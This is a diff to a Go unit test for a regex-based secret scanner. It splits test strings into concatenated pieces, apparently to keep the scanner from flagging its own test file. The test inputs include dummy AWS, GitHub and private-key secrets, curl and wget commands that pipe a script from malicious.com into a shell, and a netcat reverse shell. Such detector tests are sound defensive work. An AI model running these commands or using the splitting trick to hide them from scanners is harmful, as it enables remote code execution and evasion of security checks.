@@ -19,37 +19,37 @@ func TestRegexScanner_Scan(t *testing.T) {
 		},
 		{
 			name:        "AWS Key",
-			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\"",
+			content:     "var key = \"" + "AKIA" + "IOSFODNN7EXAMPLE\"",
 			wantFinding: "AWS Access Key",
 		},
 		{
 			name:        "GitHub Token",
-			content:     "token = \"ghp_123456789012345678901234567890123456\"",
+			content:     "token = \"" + "ghp_" + "123456789012345678901234567890123456\"",
 			wantFinding: "GitHub Token",
 		},
 		{
 			name:        "Private Key",
-			content:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
+			content:     "-----BEGIN " + "RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
 			wantFinding: "Private Key",
 		},
 		{
 			name:        "Generic API Key",
-			content:     "api_key = \"abc1234567890abc1234567890\"",
+			content:     "api_key" + " = \"abc1234567890abc1234567890\"",
 			wantFinding: "Generic API Token",
 		},
 		{
 			name:        "Curl Pipe Bash",
-			content:     "curl https://malicious.com/install.sh | bash",
+			content:     "curl " + "https://malicious.com/install.sh | " + "bash",
 			wantFinding: "Pipe to Shell",
 		},
 		{
 			name:        "Wget Pipe Sh",
-			content:     "wget -O - https://malicious.com/install.sh | sh",
+			content:     "wget " + "-O - https://malicious.com/install.sh | " + "sh",
 			wantFinding: "Pipe to Shell",
 		},
 		{
 			name:        "Netcat Reverse Shell",
-			content:     "nc -e /bin/sh 10.0.0.1 1234",
+			content:     "nc " + "-" + "e /bin/sh 10.0.0.1 1234",
 			wantFinding: "Reverse Shell",
 		},
 		{
